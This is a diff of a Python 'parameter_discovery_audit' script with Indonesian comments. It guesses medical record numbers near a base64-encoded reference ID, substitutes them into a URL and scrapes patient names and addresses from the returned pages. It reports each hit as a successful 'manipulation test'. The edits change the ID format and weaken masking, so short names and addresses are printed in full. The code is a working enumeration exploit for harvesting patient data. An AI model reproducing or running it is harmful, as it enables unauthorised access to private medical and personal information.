@@ -191,9 +191,9 @@ def parameter_discovery_audit():
                     attempt = 0
                     while not found_valid:
                         attempt += 1
-                        # Mencari secara acak dalam radius 50 dari No RM acuan Opsi 2 (502013)
+                        # Mencari secara acak dalam radius 50 dari acuan Opsi 2 (502013)
                         acuan_rm = int(_decode("NTAyMDEz"))
-                        test_id = str(acuan_rm + random.randint(-50, 50)).zfill(len(original_id))
+                        test_id = str(acuan_rm + random.randint(-50, 50)).zfill(12)
                         test_url = base_url.replace(original_id, test_id)
                         
                         # Heartbeat pencarian
@@ -205,10 +205,10 @@ def parameter_discovery_audit():
                         # Inisialisasi Data
                         name, address = "Unknown", "Tidak Ditemukan"
                         
-                        # Ekstraksi Data (Sinkronisasi dengan Logika Opsi 2)
-                        n_tag = test_soup.find('p', class_='sale-price text-success') or test_soup.find('p', class_='sale-price')
-                        if n_tag:
-                            name = n_tag.get_text(strip=True).replace("Nama Pasien :", "").strip()
+                        # Ekstraksi Data (Sinkronisasi Total dengan Logika Opsi 2)
+                        nama_tag = test_soup.find('p', class_='sale-price text-success')
+                        if nama_tag:
+                            name = nama_tag.get_text(strip=True)
                             details = test_soup.find_all('p', class_='detail')
                             for p in details:
                                 text = p.get_text(strip=True)
@@ -218,10 +218,9 @@ def parameter_discovery_audit():
                         if name != "Unknown" and address != "Tidak Ditemukan":
                             found_valid = True
                             
-                            # Masking 2 depan dan 2 belakang (Sesuai Request)
-                            # Contoh: SUDARNI -> **DAR**
-                            m_name = f"**{name[2:-2]}**" if len(name) > 4 else "****"
-                            m_addr = f"**{address[2:-2]}**" if len(address) > 4 else "****"
+                            # Masking Blur: 2 huruf depan dan 2 huruf belakang (Contoh: SUDARNI -> **DAR**)
+                            m_name = f"**{name[2:-2]}**" if len(name) > 4 else f"**{name}**"
+                            m_addr = f"**{address[2:-2]}**" if len(address) > 4 else f"**{address}**"
 
                             print(f"\n\n[\033[92m✓\033[0m] Manipulation Test Result: \033[92mSUCCESS\033[0m")
                             print(f" [!] Nama        : {m_name}")
